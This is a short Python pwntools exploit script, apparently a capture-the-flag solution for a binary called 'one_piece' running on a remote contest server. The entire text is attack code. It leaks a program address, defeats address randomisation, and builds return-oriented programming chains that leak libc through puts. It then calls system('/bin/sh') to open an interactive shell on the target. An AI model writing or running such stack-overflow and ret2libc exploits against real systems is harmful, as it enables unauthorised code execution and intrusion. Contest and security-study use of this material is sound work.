from pwn import *

#io = process("./one_piece")
io = remote("onepiece.fword.wtf",1238)
#context.log_level = "debug"

io.sendlineafter("(menu)>>","read")
payload = "a"*0x27 +"z"
io.sendafter(">>",payload)
#gdb.attach(io)
io.sendlineafter("(menu)>>","gomugomunomi")
io.recvuntil("right ? : ")
leak = int("0x"+io.recvline().replace("\n",""),16)

code_base = leak - 0xa3a
log.info("Code base : %s",hex(code_base))
leak_addr = code_base + 0x201fa0
puts = code_base + 0x720
pop_rdi = code_base + 0xba3
main = code_base + 0xb1a
pop_rsir15 = code_base + 0xba1

payload2 = "a"*56+p64(pop_rdi)+p64(leak_addr)+p64(puts)+p64(main)
io.sendlineafter("something ? : \n",payload2)
puts_leak = u64(io.recv(6).ljust(8,"\x00"))
log.info("Puts leak : %s",hex(puts_leak))
libc_base = puts_leak - 0x87490
log.info("Libc base : %s",hex(libc_base))
system = libc_base + 0x554e0
binsh = libc_base + 0x1b6613
one_gadget = libc_base + 0xe6b99

io.sendlineafter("(menu)>>","read")
io.sendafter(">>",payload)
io.sendlineafter("(menu)>>","gomugomunomi")
payload3 = "a"*56+p64(pop_rsir15)+p64(0)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(system)
io.sendafter("something ? : \n",payload3)
io.interactive()